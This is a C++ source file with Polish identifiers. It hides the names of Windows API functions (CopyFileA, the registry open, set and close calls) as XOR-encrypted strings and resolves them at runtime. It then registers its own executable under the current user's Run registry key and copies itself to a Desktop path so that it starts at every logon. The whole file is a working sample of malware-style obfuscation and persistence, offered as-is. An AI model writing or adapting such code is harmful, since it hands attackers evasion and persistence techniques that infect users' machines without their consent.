#include<string>
#include<windows.h>
#include <iostream>
#include <StringCrypter.h>
using namespace std;

typedef BOOL(WINAPI * __KopiujPlik)
(
    LPCTSTR lpExistingFileName,
    LPCTSTR lpNewFileName,
    BOOL bFailIfExists
);

typedef LONG(WINAPI * __OtworzRejestr)
(
    HKEY hKey,
    LPCTSTR lpSubKey,
    DWORD ulOptions,
    REGSAM samDesired,
    PHKEY phkResult
);
typedef LONG(WINAPI * __UstawRejestr)
(
    HKEY hKey,
    LPCTSTR lpValueName,
    DWORD Reserved,
    DWORD dwType,
    const BYTE *lpData,
    DWORD cbData
);
typedef LONG(WINAPI * __ZamknijRejestr)
(
    HKEY hKey
);

char nazwaFunkcjiKopiowania[] = "325E074B235A1E5135";    //CopyFileA
char nazwaFunkcjiOtwierania[] = "2354107D15561C7F114C3C4E34";    //RegOpenKeyExA
char nazwaFunkcjiZapisywania[] = "235410610047245518401C730D76";  //RegSetValueExA
char nazwaFunkcjiZamykania[] = "23541071095C01513F5000";   //RegCloseKey
char bibliotekaKernel[] = "3A54055C005F41065A51155A";   //Kernel32.dll
char bibliotekaAdvapi[] = "30550153155A41065A51155A";   //Advapi32.dll

char nazwaKlucza[] = "225E1146125200512878105507581A57094D2C67185F135D12402E7701470B531B433F5D1D4A195F1F6D25470B"; //Run
char nazwaWRejestrze[] = "3044035D16471346006F18450F4E0F4A004E115E08";  //AutostartZaszyfr

StringCrypter *o1 = new StringCrypter("q1w2e3r4t5y6u7i8o9p0");

__KopiujPlik kopiujPlik = (__KopiujPlik)GetProcAddress(GetModuleHandle(o1->encryptDecrypt(bibliotekaKernel, true).c_str()), o1->encryptDecrypt(nazwaFunkcjiKopiowania, true).c_str());
__OtworzRejestr otworzRejestr = (__OtworzRejestr)GetProcAddress(GetModuleHandle(o1->encryptDecrypt(bibliotekaAdvapi, true).c_str()), o1->encryptDecrypt(nazwaFunkcjiOtwierania, true).c_str());
__UstawRejestr ustawRejestr = (__UstawRejestr)GetProcAddress(GetModuleHandle(o1->encryptDecrypt(bibliotekaAdvapi, true).c_str()), o1->encryptDecrypt(nazwaFunkcjiZapisywania, true).c_str());
__ZamknijRejestr zamknijRejestr = (__ZamknijRejestr)GetProcAddress(GetModuleHandle(o1->encryptDecrypt(bibliotekaAdvapi, true).c_str()), o1->encryptDecrypt(nazwaFunkcjiZamykania, true).c_str());

int main( int argc, char * argv[] )

{
    HKEY hkey;
    LPCTSTR keyName = o1->encryptDecrypt(nazwaKlucza, true).c_str();
    LPCTSTR filePath = "C:\\Users\\Patryk\\Desktop\\autostart.exe";
    RegOpenKeyExA(HKEY_CURRENT_USER,keyName,0,KEY_ALL_ACCESS,&hkey);
    ustawRejestr(hkey,o1->encryptDecrypt(nazwaWRejestrze, true).c_str(),0,1,(LPBYTE)filePath, strlen(filePath)+1);
    zamknijRejestr(hkey);
    kopiujPlik(argv[0], filePath, 0);
    return 0;
}

